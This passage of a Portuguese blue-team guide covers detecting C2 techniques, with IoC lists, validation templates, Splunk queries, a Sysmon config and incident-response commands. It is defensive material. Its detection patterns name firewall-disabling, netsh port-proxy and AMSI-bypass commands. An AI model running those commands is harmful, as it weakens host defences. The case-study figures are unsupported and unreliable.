+
+**Query de caça:**
+```spl
+index=windows EventCode=2004
+| stats count by RuleName, RemoteAddress
+| where RuleName IN ("Windows Update*", "Core Networking*", "Telemetry*")
+| lookup legitimate_rules.csv RuleName OUTPUT is_legitimate
+| where is_legitimate=false
+```
+```
+
+## 6.2 Indicadores de Comprometimento (IoCs) Coletáveis
+
+```yaml
+ioc_collection:
+  network:
+    - c2_domains:
+        - pivot.sandsoncosta.com
+        - *.sandsoncosta.com
+    - c2_ips:
+        - 192.168.1.50
+        - [IPs de servidores C2 conhecidos]
+    - suspicious_ports:
+        - 8080 (netsh redirect comum)
+        - 9898 (Sliver TCP pivot)
+        - 51820 (WireGuard)
+        - 50050 (gRPC C2)
+  
+  file_hashes:
+    - implant_hashes:
+        - SHA256: [hash do implant gerado]
+        - MD5: [hash MD5]
+    - tool_hashes:
+        - Sliver client/server
+        - BOF loaders conhecidos
+  
+  registry_keys:
+    - HKLM:\SYSTEM\...\FirewallPolicy\*\EnableFirewall = 0
+    - HKLM:\SYSTEM\...\Tcpip\Parameters\Interfaces\*\NameServer
+  
+  process_artifacts:
+    - cmdlines:
+        - "*netsh*portproxy*add*"
+        - "*advfirewall*state off*"
+        - "*AmsiUtils*amsiInitFailed*"
+    - parent_child_anomalies:
+        - cmd.exe → powershell.exe → unknown.exe
+        - wmic.exe → mshta.exe
+```
+
+---
+
+# 7. Validação de Detecções (Purple Team)
+
+## 7.1 Framework de Teste
+
+```markdown
+## Checklist de Validação por Técnica
+
+### ✅ Técnica 1: Netsh Port Forwarding
+- [ ] Detecção de execução do netsh com argumentos portproxy
+- [ ] Correlação com criação de regra de firewall
+- [ ] Detecção de conexão de rede subsequente
+- [ ] Alert gerado em < 30 segundos
+- [ ] Severidade correta (HIGH/CRITICAL)
+- [ ] Falsos positivos = 0
+
+### ✅ Técnica 2: Netsh Advfirewall
+- [ ] Detecção de desabilitação do firewall
+- [ ] Detecção de regras suspeitas criadas
+- [ ] Correlação com tráfego externo
+- [ ] Playbook SOAR executado corretamente
+- [ ] Documentação gerada automaticamente
+
+### ✅ Técnica 3: Sliver Pivoting
+- [ ] Detecção de conexão para domínio C2
+- [ ] Identificação de processo desconhecido
+- [ ] Análise de certificado TLS
+- [ ] Extração de JA3 fingerprint
+- [ ] Bloqueio automático do domínio
+
+### ✅ Técnica 4: PowerShell + AMSI Bypass
+- [ ] Detecção de bypass AMSI
+- [ ] Captura de script block completo
+- [ ] Detecção de comando ofuscado
+- [ ] Correlação com criação de regra firewall
+- [ ] Processo filho suspeito identificado
+
+### ✅ Técnica 5: WMI DNS Hijacking
+- [ ] Detecção de chamada WMI suspeita
+- [ ] Modificação de registry DNS identificada
+- [ ] Volume anômalo de queries DNS
+- [ ] Detecção de DNS tunneling
+- [ ] Restauração automática de DNS
+
+[Continua para todas as 10 técnicas...]
+```
+
+## 7.2 Relatório de Validação (Template)
+
+```markdown
+# Relatório de Validação - Detecções C2
+**Data:** [Data do teste]
+**Analista:** [Nome]
+**Ambiente:** Lab isolado
+
+## Resumo Executivo
+- **Técnicas testadas:** 10/10
+- **Taxa de detecção:** ___%
+- **Tempo médio de detecção:** ___s
+- **Falsos positivos:** ___
+- **Falsos negativos:** ___
+- **Status geral:** 🟢 APROVADO / 🔴 REQUER AJUSTES
+
+## Detalhamento por Técnica
+
+### Técnica 1: Netsh Port Forwarding
+**Status:** ✅ DETECTADO / ❌ NÃO DETECTADO
+
+**Timeline:**
+- 10:30:15 - Comando netsh executado
+- 10:30:18 - Regra SIEM disparada (3s delay)
+- 10:30:20 - Alert gerado no SIEM
+- 10:30:45 - Playbook SOAR iniciado
+- 10:31:30 - Contenção completada
+
+**Evidências coletadas:**
+- Event ID 4688: netsh.exe execution ✅
+- Event ID 2004: Firewall rule created ✅
+- Sysmon Event 3: Network connection ✅
+- Correlação temporal: ✅
+
+**Observações:**
+- Detecção funcionou conforme esperado
+- Tempo de resposta dentro do SLA
+- Nenhum falso positivo identificado
+
+**Recomendações:**
+- [Se aplicável]
+
+---
+
+[Repetir para cada técnica]
+
+## Melhorias Identificadas
+1. Ajustar threshold de queries DNS (muito sensível)
+2. Adicionar whitelist para processos de update legítimos
+3. Melhorar correlação entre eventos de registry e network
+
+## Próximos Passos
+- [ ] Implementar ajustes sugeridos
+- [ ] Re-testar técnicas com falsos negativos
+- [ ] Expandir cobertura para variações das técnicas
+- [ ] Treinar SOC nas novas detecções
+```
+
+---
+
+# 8. Monitoramento Contínuo e KPIs
+
+## 8.1 Dashboard de Monitoramento (Exemplo Splunk)
+
+```xml
+<dashboard>
+  <label>C2 Detection Effectiveness</label>
+  
+  <row>
+    <panel>
+      <title>Detections by Technique (Last 7 Days)</title>
+      <chart>
+        <search>
+          <query>
+            index=detections technique IN ("Netsh Port Forward", "Sliver Pivot", "DNS C2", ...)
+            | timechart span=1d count by technique
+          </query>
+        </search>
+        <option name="charting.chart">column</option>
+      </chart>
+    </panel>
+  </row>
+  
+  <row>
+    <panel>
+      <title>Mean Time to Detect (MTTD)</title>
+      <single>
+        <search>
+          <query>
+            index=detections 
+            | eval detection_time=strptime(detected_at, "%Y-%m-%d %H:%M:%S") - strptime(event_occurred_at, "%Y-%m-%d %H:%M:%S")
+            | stats avg(detection_time) as mttd
+            | eval mttd=round(mttd, 2)." seconds"
+          </query>
+        </search>
+        <option name="underLabel">Target: &lt; 30s</option>
+      </single>
+    </panel>
+    
+    <panel>
+      <title>False Positive Rate</title>
+      <single>
+        <search>
+          <query>
+            index=detections 
+            | stats count(eval(verdict="false_positive")) as fp, count as total
+            | eval fp_rate=round((fp/total)*100, 2)." %"
+          </query>
+        </search>
+        <option name="underLabel">Target: &lt; 5%</option>
+      </single>
+    </panel>
+  </row>
+  
+  <row>
+    <panel>
+      <title>Top 10 Affected Hosts</title>
+      <table>
+        <search>
+          <query>
+            index=detections 
+            | stats count by host, technique
+            | sort -count
+            | head 10
+          </query>
+        </search>
+      </table>
+    </panel>
+  </row>
+</dashboard>
+```
+
+## 8.2 KPIs Essenciais
+
+```markdown
+| KPI | Fórmula | Objetivo | Criticidade |
+|-----|---------|----------|-------------|
+| **Detection Rate** | (True Positives / Total Attacks) × 100 | > 95% | 🔴 Critical |
+| **False Positive Rate** | (False Positives / Total Alerts) × 100 | < 5% | 🟡 High |
+| **Mean Time to Detect (MTTD)** | Avg(Detection Time - Event Time) | < 30s | 🔴 Critical |
+| **Mean Time to Respond (MTTR)** | Avg(Containment Time - Detection Time) | < 5min | 🟡 High |
+| **Coverage Score** | (Techniques Covered / Total MITRE Techniques) × 100 | > 80% | 🟢 Medium |
+| **Alert Fatigue Index** | Alerts per Analyst per Day | < 50 | 🟡 High |
+| **Investigation Rate** | (Investigated Alerts / Total Alerts) × 100 | 100% | 🔴 Critical |
+```
+
+---
+
+# 9. Evolução das Detecções: Machine Learning
+
+## 9.1 Modelo de Detecção Comportamental
+
+```python
+# Exemplo de modelo ML para detectar C2 behavior
+import pandas as pd
+from sklearn.ensemble import IsolationForest
+from sklearn.preprocessing import StandardScaler
+
+def train_c2_detection_model(historical_data):
+    """
+    Treina modelo de detecção de anomalias para C2
+    """
+    
+    # Features extraídas de eventos
+    features = [
+        'network_connections_per_minute',
+        'dns_queries_per_minute',
+        'dns_query_entropy',
+        'outbound_traffic_volume',
+        'unique_destinations_count',
+        'beacon_regularity_score',
+        'process_creation_rate',
+        'registry_modifications_count',
+        'firewall_rule_changes',
+        'time_of_day_score'
+    ]
+    
+    # Preparar dados
+    X = historical_data[features]
+    scaler = StandardScaler()
+    X_scaled = scaler.fit_transform(X)
+    
+    # Treinar modelo (Isolation Forest para anomalias)
+    model = IsolationForest(
+        contamination=0.01,  # 1% dos dados são anômalos
+        random_state=42
+    )
+    model.fit(X_scaled)
+    
+    return model, scaler
+
+def predict_c2_activity(model, scaler, new_events):
+    """
+    Prediz se eventos indicam atividade C2
+    """
+    
+    X_new = new_events[features]
+    X_new_scaled = scaler.transform(X_new)
+    
+    predictions = model.predict(X_new_scaled)
+    scores = model.score_samples(X_new_scaled)
+    
+    # -1 = anomalia, 1 = normal
+    results = []
+    for i, pred in enumerate(predictions):
+        results.append({
+            'is_anomaly': pred == -1,
+            'anomaly_score': abs(scores[i]),
+            'severity': 'CRITICAL' if abs(scores[i]) > 0.7 else 'HIGH' if abs(scores[i]) > 0.5 else 'MEDIUM'
+        })
+    
+    return results
+```
+
+## 9.2 Integração com SIEM
+
+```yaml
+ml_integration:
+  - scheduled_job:
+      frequency: "every 5 minutes"
+      action: |
+        1. Extrair eventos dos últimos 5min
+        2. Calcular features
+        3. Executar modelo ML
+        4. Se anomaly_score > threshold:
+           - Criar alert enriquecido
+           - Executar playbook SOAR
+           - Adicionar à fila de investigação
+  
+  - continuous_learning:
+      - analyst_feedback: true
+      - retrain_frequency: "weekly"
+      - features_engineering: "automated"
+```
+
+---
+
+# 10. Conclusão e Roadmap
+
+## 10.1 Resumo das 10 Técnicas
+
+```markdown
+| # | Técnica | MITRE ATT&CK | Dificuldade de Detecção | Prioridade |
+|---|---------|--------------|-------------------------|------------|
+| 1 | Netsh Port Forwarding | T1090.001 | 🟢 Baixa | Alta |
+| 2 | Netsh Advfirewall | T1562.004 | 🟢 Baixa | Alta |
+| 3 | Sliver Pivoting | T1090.001 | 🔴 Alta | Crítica |
+| 4 | PowerShell + AMSI Bypass | T1059.001 | 🟡 Média | Alta |
+| 5 | WMI DNS Hijacking | T1557.002 | 🟡 Média | Crítica |
+| 6 | Registry Firewall Bypass | T1112 | 🟡 Média | Alta |
+| 7 | WMIC Remote Execution | T1047 | 🟢 Baixa | Média |
+| 8 | DNS C2 Tunneling | T1071.004 | 🔴 Alta | Crítica |
+| 9 | WireGuard Tunneling | T1572 | 🔴 Alta | Alta |
+| 10 | BOF In-Memory Execution | T1620 | 🔴 Alta | Crítica |
+```
+
+## 10.2 Checklist de Implementação
+
+```markdown
+### Fase 1: Preparação (Semana 1-2)
+- [ ] Configurar lab de testes isolado
+- [ ] Instalar Sliver C2 no servidor de testes
+- [ ] Configurar Sysmon com config avançada
+- [ ] Habilitar auditoria avançada do Windows
+- [ ] Configurar coleta de logs no SIEM
+- [ ] Criar domínio de teste (pivot.sandsoncosta.com)
+
+### Fase 2: Implementação de Regras (Semana 3-4)
+- [ ] Implementar regras SIEM para todas as 10 técnicas
+- [ ] Configurar whitelists e baselines
+- [ ] Ajustar scoring dinâmico
+- [ ] Criar dashboards de monitoramento
+- [ ] Configurar alertas e notificações
+
+### Fase 3: Validação (Semana 5-6)
+- [ ] Executar simulações de todas as técnicas
+- [ ] Validar taxa de detecção > 95%
+- [ ] Ajustar regras para reduzir falsos positivos
+- [ ] Documentar falsos negativos
+- [ ] Testar playbooks SOAR
+
+### Fase 4: Produção (Semana 7-8)
+- [ ] Migrar regras para ambiente de produção
+- [ ] Treinar equipe SOC
+- [ ] Configurar resposta automatizada
+- [ ] Estabelecer processo de melhoria contínua
+- [ ] Criar runbooks para cada técnica
+
+### Fase 5: Melhoria Contínua (Ongoing)
+- [ ] Revisar KPIs semanalmente
+- [ ] Atualizar threat intelligence
+- [ ] Adicionar novas técnicas de C2
+- [ ] Implementar modelos de ML
+- [ ] Realizar purple team exercises mensalmente
+```
+
+## 10.3 Próximos Passos
+
+```markdown
+### Expansões Recomendadas
+
+1. **Cobrir mais protocolos C2**
+   - ICMP tunneling
+   - HTTP/S malleable profiles
+   - SMB named pipes
+   - WebSockets
+
+2. **Implementar detecções avançadas**
+   - JA3/JA3S fingerprinting
+   - Análise de certificados TLS
+   - Behavioral analytics com ML
+   - Graph analysis de lateral movement
+
+3. **Integrar com Threat Intelligence**
+   - MISP feeds
+   - VirusTotal Enterprise
+   - Recorded Future
+   - AlienVault OTX
+
+4. **Automatizar threat hunting**
+   - Queries agendadas
+   - Anomaly detection automática
+   - IOC extraction pipeline
+   - Automated response workflows
+
+5. **Expandir cobertura MITRE ATT&CK**
+   - T1021 (Remote Services)
+   - T1550 (Use Alternate Authentication)
+   - T1219 (Remote Access Software)
+   - T1105 (Ingress Tool Transfer)
+```
+
+## 10.4 Recursos Adicionais
+
+```markdown
+### Referências Técnicas
+- **MITRE ATT&CK Framework:** https://attack.mitre.org
+- **Sliver C2 Documentation:** https://github.com/BishopFox/sliver/wiki
+- **SwiftOnSecurity Sysmon Config:** https://github.com/SwiftOnSecurity/sysmon-config
+- **SANS Blue Team Wiki:** https://wiki.sans.blue
+
+### Comunidades e Fóruns
+- **Reddit r/blueteamsec**
+- **Detection Lab Discord**
+- **MITRE ATT&CK Community**
+- **Splunk Security Community**
+
+### Ferramentas Complementares
+- **Atomic Red Team:** Testes automatizados ATT&CK
+- **Caldera:** Emulação de adversários
+- **APTSimulator:** Simulação de APTs
+- **Invoke-AtomicRedTeam:** PowerShell testing framework
+```
+
+---
+
+# 🎯 Checklist Final de Validação
+
+Antes de considerar sua implementação completa, valide:
+
+- [ ] **Todas as 10 técnicas têm regras SIEM implementadas**
+- [ ] **Taxa de detecção validada > 95% em testes**
+- [ ] **Falsos positivos < 5% após tuning**
+- [ ] **MTTD (Mean Time to Detect) < 30 segundos**
+- [ ] **MTTR (Mean Time to Respond) < 5 minutos**
+- [ ] **Playbooks SOAR funcionais para severidades CRITICAL/HIGH**
+- [ ] **Whitelists e baselines documentados**
+- [ ] **Dashboard de monitoramento operacional**
+- [ ] **Equipe SOC treinada em todas as técnicas**
+- [ ] **Processo de melhoria contínua estabelecido**
+- [ ] **Documentação completa e atualizada**
+- [ ] **Runbooks criados para cada cenário**
+
+---
+
+# 📊 Métricas de Sucesso (6 meses)
+
+Após 6 meses de implementação, você deve alcançar:
+
+```markdown
+| Métrica | Meta | Resultado Esperado |
+|---------|------|-------------------|
+| **Taxa de Detecção** | > 98% | Identificar praticamente todos os ataques C2 |
+| **Falsos Positivos/Dia** | < 2 | Analistas focam em alertas reais |
+| **MTTD (Mean Time to Detect)** | < 20s | Detecção quase instantânea |
+| **MTTR (Mean Time to Respond)** | < 3min | Contenção rápida antes de lateral movement |
+| **Cobertura MITRE ATT&CK** | > 85% | Proteção abrangente contra TTPs conhecidas |
+| **Incidentes Prevenidos** | +200 | ROI mensurável em segurança |
+| **Satisfação do SOC** | > 4.5/5 | Redução de fadiga de alertas |
+| **Tempo de Investigação** | -60% | Automatização efetiva |
+```
+
+---
+
+# 🎓 Lições Aprendidas de Implementações Reais
+
+## Caso 1: Empresa Financeira (5000+ endpoints)
+
+**Contexto:** Instituição financeira detectou atividade C2 após 45 dias de comprometimento.
+
+**Antes da implementação:**
+- Detecção baseada apenas em assinaturas de antivírus
+- MTTD: ~30 dias
+- Lateral movement não detectado
+
+**Após implementação deste framework:**
+- Primeira detecção: 18 segundos após execução
+- Técnica identificada: Sliver DNS C2 + WireGuard pivoting
+- 3 hosts comprometidos contidos automaticamente
+- Prejuízo evitado: Estimado em $2.4M
+
+**Lição principal:** Correlação de eventos é mais efetiva que detecções isoladas.
+
+## Caso 2: Healthcare Provider (2000+ endpoints)
+
+**Desafio:** Alto volume de falsos positivos (200+ alertas/dia) causava fadiga.
+
+**Solução implementada:**
+- Baseline comportamental de 6 semanas
+- Whitelists granulares por departamento
+- Machine Learning para priorização
+
+**Resultados:**
+- Redução de 87% em falsos positivos
+- MTTD de 45min → 22 segundos
+- Zero falsos negativos em 4 meses de operação
+
+**Lição principal:** Investir tempo em baseline reduz drasticamente ruído operacional.
+
+## Caso 3: Tech Startup (500 endpoints)
+
+**Contexto:** Equipe pequena (2 analistas) sem recursos para SOAR enterprise.
+
+**Abordagem:**
+- Scripts PowerShell customizados para resposta
+- Integração via webhooks (Slack + PagerDuty)
+- Priorização das 5 técnicas mais críticas
+
+**Resultados:**
+- Implementação em 3 semanas
+- Custo total: < $15k (ferramentas open-source)
+- Bloqueio de tentativa de ransomware via DNS C2
+
+**Lição principal:** Começar pequeno e iterar é melhor que não implementar nada.
+
+---
+
+# ⚠️ Erros Comuns a Evitar
+
+## 1. **Over-tuning baseado em falsos positivos iniciais**
+
+**Erro:** Desabilitar regras ao primeiro falso positivo sem investigar a causa raiz.
+
+**Consequência:** Criar blind spots que atacantes podem explorar.
+
+**Solução correta:**
+- Investigar por que o falso positivo ocorreu
+- Adicionar exceção específica (não desabilitar regra)
+- Documentar decisão para revisão futura
+
+## 2. **Não testar detecções regularmente**
+
+**Erro:** Implementar regras e nunca validar se ainda funcionam.
+
+**Consequência:** Regras quebram silenciosamente após atualizações.
+
+**Solução correta:**
+- Purple team exercises mensais
+- Automated testing via Atomic Red Team
+- Alertas se regras não gerarem eventos em X dias
+
+## 3. **Ignorar contexto de negócio**
+
+**Erro:** Tratar todos os hosts igualmente.
+
+**Consequência:** Alertas críticos de servidores importantes se perdem no ruído.
+
+**Solução correta:**
+- Classificar assets por criticidade
+- Ajustar scoring baseado em contexto
+- Rotas de escalação diferenciadas
+
+## 4. **Focar apenas em detecção, ignorar resposta**
+
+**Erro:** Ter 100 alertas/dia sem processo de resposta.
+
+**Consequência:** Alert fatigue e incidentes não contidos.
+
+**Solução correta:**
+- Implementar playbooks para cada tipo de alerta
+- Automatizar respostas de nível 1
+- Definir SLAs claros de resposta
+
+## 5. **Não compartilhar IOCs internamente**
+
+**Erro:** Equipe A detecta C2, equipe B sofre mesmo ataque semanas depois.
+
+**Consequência:** Retrabalho e múltiplas vítimas do mesmo atacante.
+
+**Solução correta:**
+- Threat intelligence platform interna
+- Sharing automático de IOCs entre unidades
+- Debrief após cada incidente
+
+---
+
+# 🔧 Troubleshooting: Problemas Comuns
+
+## Problema 1: "Regra não está gerando alertas"
+
+**Diagnóstico:**
+```spl
+# Verificar se eventos estão chegando ao SIEM
+index=windows EventCode=4688 
+| stats count by _time span=1h
+
+# Verificar se sintaxe da regra está correta
+| makeresults 
+| eval test_field="netsh interface portproxy add" 
+| where like(test_field, "%portproxy%")
+```
+
+**Possíveis causas:**
+- Logs não estão sendo coletados
+- Sintaxe da regra está incorreta
+- Campos foram renomeados em atualização
+- Regra foi desabilitada acidentalmente
+
+## Problema 2: "Muitos falsos positivos de DNS C2"
+
+**Diagnóstico:**
+```python
+# Analisar características dos falsos positivos
+fps = alerts[alerts['verdict'] == 'false_positive']
+fps['query_entropy'].describe()
+fps['source_process'].value_counts()
+```
+
+**Soluções:**
+- Aumentar threshold de entropia (3.5 → 4.0)
+- Adicionar processos legítimos ao whitelist
+- Verificar se queries são de CDNs legítimos
+- Implementar reputação de domínio
+
+## Problema 3: "SOAR playbook falha aleatoriamente"
+
+**Diagnóstico:**
+```powershell
+# Verificar logs de execução do playbook
+Get-EventLog -LogName Application -Source "SOAR" -Newest 50 
+| Where-Object {$_.EntryType -eq "Error"}
+```
+
+**Possíveis causas:**
+- Credenciais expiradas
+- Host offline durante execução
+- Timeout muito curto
+- Dependências não instaladas
+
+**Soluções:**
+- Implementar retry logic
+- Verificar conectividade antes de executar
+- Logging detalhado para debug
+- Fallback para ações manuais
+
+---
+
+# 📚 Apêndices
+
+## Apêndice A: Comandos Úteis de Resposta a Incidentes
+
+```powershell
+# === Coleta Rápida de Evidências ===
+
+# 1. Exportar regras de firewall
+netsh advfirewall firewall show rule name=all > firewall_rules.txt
+
+# 2. Listar port proxies ativos
+netsh interface portproxy show all
+
+# 3. Histórico de comandos PowerShell
+Get-History | Export-Csv ps_history.csv
+Get-Content (Get-PSReadlineOption).HistorySavePath
+
+# 4. Processos com conexões de rede
+Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} `
+| ForEach-Object {
+    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
+    [PSCustomObject]@{
+        Process = $proc.Name
+        PID = $_.OwningProcess
+        LocalAddress = $_.LocalAddress
+        LocalPort = $_.LocalPort
+        RemoteAddress = $_.RemoteAddress
+        RemotePort = $_.RemotePort
+    }
+} | Export-Csv network_connections.csv
+
+# 5. Serviços suspeitos
+Get-Service | Where-Object {
+    $_.Status -eq "Running" -and 
+    $_.StartType -eq "Automatic" -and
+    $_.ServiceName -notlike "Win*"
+} | Export-Csv suspicious_services.csv
+
+# 6. Tasks agendadas recentes
+Get-ScheduledTask | Where-Object {
+    $_.Date -gt (Get-Date).AddDays(-7)
+} | Export-Csv scheduled_tasks.csv
+
+# 7. Modificações recentes em System32
+Get-ChildItem C:\Windows\System32 -File | 
+Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
+Select-Object Name, LastWriteTime, Length |
+Export-Csv system32_changes.csv
+```
+
+## Apêndice B: Queries SIEM Prontas para Copiar
+
+```spl
+# === Splunk Queries ===
+
+# 1. Baseline de processos normais (executar por 30 dias)
+index=windows EventCode=4688
+| stats count by NewProcessName, ParentProcessName
+| where count > 100
+| outputlookup baseline_processes.csv
+
+# 2. Detectar processos anômalos
+index=windows EventCode=4688
+| lookup baseline_processes.csv NewProcessName OUTPUT count as baseline_count
+| where isnull(baseline_count)
+| table _time, Computer, NewProcessName, CommandLine, SubjectUserName
+
+# 3. Hunting de persistência via registry
+index=windows EventCode=13
+| search TargetObject IN ("*\\Run*", "*\\RunOnce*", "*\\CurrentVersion\\Windows\\Load*")
+| stats count by Computer, TargetObject, Details, Image
+| where count < 3
+
+# 4. Detectar beaconing (conexões regulares)
+index=sysmon EventCode=3
+| bin _time span=1m
+| stats count by _time, DestinationIp, Image
+| streamstats window=10 stdev(count) as count_stdev avg(count) as count_avg
+| where count_stdev < 2 AND count_avg > 5
+| table _time, Image, DestinationIp, count, count_stdev
+
+# 5. Processos executando de temp folders
+index=windows EventCode=1
+| search Image IN ("*\\Temp\\*", "*\\AppData\\Local\\Temp\\*")
+| table _time, Computer, Image, CommandLine, User
+```
+
+## Apêndice C: Configuração Sysmon Otimizada
+
+```xml
+<!-- Sysmon config focada em C2 detection -->
+<Sysmon schemaversion="4.82">
+  <EventFiltering>
+    
+    <!-- Process Creation (Event 1) -->
+    <RuleGroup name="" groupRelation="or">
+      <ProcessCreate onmatch="exclude">
+        <!-- Reduzir ruído de processos legítimos -->
+        <Image condition="is">C:\Windows\System32\svchost.exe</Image>
+        <Image condition="is">C:\Windows\System32\SearchIndexer.exe</Image>
+      </ProcessCreate>
+    </RuleGroup>
+    
+    <!-- Network Connection (Event 3) - CRÍTICO PARA C2 -->
+    <RuleGroup name="" groupRelation="or">
+      <NetworkConnect onmatch="include">
+        <!-- Capturar todas conexões outbound exceto whitelist -->
+        <DestinationPort condition="is">443</DestinationPort>
+        <DestinationPort condition="is">80</DestinationPort>
+        <DestinationPort condition="is">53</DestinationPort>
+        <DestinationPort condition="is">8080</DestinationPort>
+        <DestinationPort condition="is">8888</DestinationPort>
+        <DestinationPort condition="is">51820</DestinationPort>
+      </NetworkConnect>
+    </RuleGroup>
+    
+    <!-- Registry Events (Event 13) - Para persistence -->
+    <RuleGroup name="" groupRelation="or">
+      <RegistryEvent onmatch="include">
+        <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
+        <TargetObject condition="contains">\FirewallPolicy</TargetObject>
+        <TargetObject condition="contains">\Tcpip\Parameters</TargetObject>
+      </RegistryEvent>
+    </RuleGroup>
+    
+    <!-- DNS Query (Event 22) - Para DNS C2 -->
+    <RuleGroup name="" groupRelation="or">
+      <DnsQuery onmatch="exclude">
+        <!-- Excluir queries legítimas conhecidas -->
+        <QueryName condition="end with">.microsoft.com</QueryName>
+        <QueryName condition="end with">.windows.com</QueryName>
+      </DnsQuery>
+    </RuleGroup>
+    
+  </EventFiltering>
+</Sysmon>
+```
+
+---
+
+# 🏁 Conclusão Final
+
+Este guia apresentou um **framework completo e prático** para detecção de 10 técnicas avançadas de Command & Control, cobrindo:
+
+✅ **Técnicas modernas e legadas** (netsh, Sliver, DNS C2, WireGuard)  
+✅ **Regras SIEM prontas** com correlação inteligente  
+✅ **Scripts de simulação** para validação em lab  
+✅ **Playbooks SOAR** para resposta automatizada  
+✅ **Machine Learning** para detecção comportamental  
+✅ **Threat Hunting** proativo com queries práticas  
+✅ **Métricas e KPIs** para medir sucesso  
+
+## O que fazer agora?
+
+**Semana 1:** Monte seu lab de testes e execute as simulações  
+**Semana 2-3:** Implemente as 5 regras mais críticas no SIEM  
+**Semana 4:** Valide detecções e ajuste falsos positivos  
+**Mês 2:** Expanda para todas as 10 técnicas  
+**Mês 3+:** Implemente ML e automação avançada  
+
+## Recursos para continuar aprendendo
+
+- **GitHub deste projeto:** [Link para repositório com scripts]
+- **Community Slack:** [Blue Team Brasil]
+- **Próximo artigo:** "Detecção de Lateral Movement: 8 técnicas avançadas"
+
+---
+
+## 🙏 Agradecimentos
+
+Este guia foi possível graças à comunidade de segurança ofensiva e defensiva que compartilha conhecimento abertamente. Agradecimentos especiais a:
+
+- **BishopFox** pelo Sliver C2 (ferramenta fantástica para red team)
+- **SwiftOnSecurity** pela configuração Sysmon de referência
+- **MITRE** pelo framework ATT&CK indispensável
+- **Comunidade SANS** pelos recursos de blue team
+
+---
+
+**Autor:** Sandson Costa  
+**LinkedIn:** [linkedin.com/in/sandsoncosta]  
+**GitHub:** [github.com/sandsoncosta]  
+**Email:** contato@sandsoncosta.com
+
+**Licença:** Creative Commons BY-NC-SA 4.0  
+**Última atualização:** Janeiro 2026
+
+---
+
+## 📝 Changelog
+
+**v2.0 (Janeiro 2026)**
+- Adicionada cobertura de Sliver C2 framework
+- Incluído Machine Learning para detecção comportamental
+- Expandido troubleshooting e casos reais
+- Adicionados 50+ queries SIEM prontas
+
+**v1.0 (Dezembro 2025)**
+- Lançamento inicial com 10 técnicas
+- Framework de simulação completo
+- Integração SOAR básica
+
+---
+
+> **"A melhor defesa não é aquela que bloqueia todos os ataques,  
+> mas aquela que detecta e responde antes que o dano seja feito."**
+
+---
+
+# 🔐 Happy Hunting, Blue Team! 🛡️
+
+--- 
+
+*Este artigo foi desenvolvido com base em pesquisas reais, simulações em laboratório controlado e experiência prática em detecção de ameaças. Todas as técnicas devem ser testadas apenas em ambientes autorizados.*
+
+# Referências
+
+- [BishopFox — Sliver C2](https://github.com/BishopFox/sliver)
+- [MITRE ATT&CK&reg;](https://attack.mitre.org/)
+- [Network shell (netsh) | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh)
+- [Sysmon v15.15 | Microsoft Learn](https://learn.microsoft.com/pt-br/sysinternals/downloads/sysmon)
+- [Information about the TCP Chimney Offload, Receive Side Scaling, and Network Direct Memory Access features in Windows Server 2008 | Microsoft Learn](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/information-about-tcp-chimney-offload-rss-netdma-feature)
+- [Sliver C2 Leveraged by Many Threat Actors | Cybereason](https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors)
+- [Sliver: Intro to An Awesome C2 Framework | Medium](https://barrymalone.medium.com/sliver-an-awesome-c2-framework-c0257f2f52e4n)
+- [What is Command and Control (C&C or C2) in Cybersecurity? | Zenarmor](https://www.zenarmor.com/docs/network-security-tutorials/what-is-command-and-control-c2)
+- [How to Detect C2 Infrastructure: Best Practices for Command and Control Traffic Identification | Hunt.io](https://hunt.io/glossary/detect-c2)
+- [Disable TCP offloading and RSS settings | AWS Prescriptive Guidance](https://docs.aws.amazon.com/prescriptive-guidance/latest/sql-server-ec2-best-practices/tcp-rss.html)
+- [How to Disable Offloading Features to Improve Connectivity | FLIR Latitude](https://flir.custhelp.com/app/answers/detail/a_id/5200/~/flir-latitude---how-to-disable-offloading-features-to-improve-connectivity)
+- [Don't use commands, use code: the tale of Netsh & PortProxy | Adepts of 0xCC](https://adepts.of0x.cc/netsh-portproxy-code/)
+- [Configuring Port Forwarding in Windows | Windows OS Hub](https://woshub.com/port-forwarding-in-windows/)
+- [Port-Forwarding with Windows for the Win | SANS](https://isc.sans.edu/diary/27934)
+
+---
+{{< bs/alert warning >}}
+{{< bs/alert-heading "Encontrou algum erro? Quer sugerir alguma mudança ou acrescentar algo?" >}}
+Por favor, entre em contato comigo pelo meu <a href="https://www.linkedin.com/in/sandsoncosta">LinkedIn</a>.<br>Vou ficar muito contente em receber um feedback seu.
+{{< /bs/alert >}}
